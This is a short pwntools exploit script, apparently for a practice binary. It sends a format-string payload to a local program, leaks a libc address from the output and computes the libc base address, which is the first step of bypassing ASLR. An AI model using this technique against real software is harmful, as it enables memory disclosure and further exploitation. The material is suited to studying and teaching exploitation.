from pwn import *
import struct

elf = ELF('./app')
libc =ELF('/lib/x86_64-linux-gnu/libc.so.6')
io=elf.process()
raw_input("Press return to continue... ")
io.recvregex(b':')
info('Relaying the format string now ')
io.sendline(b'%p,%p,%p')
io.recvline()
leak = int(io.recvline().split(b',')[2].strip(),16)
info('leaked address in libc: 0x{:08x}'.format(leak))

libc.address = leak - libc.symbols['_IO_2_1_stdin_']
info('calculated base address of libc: 0x{:08x}'.format(libc.address))
io.interactive()
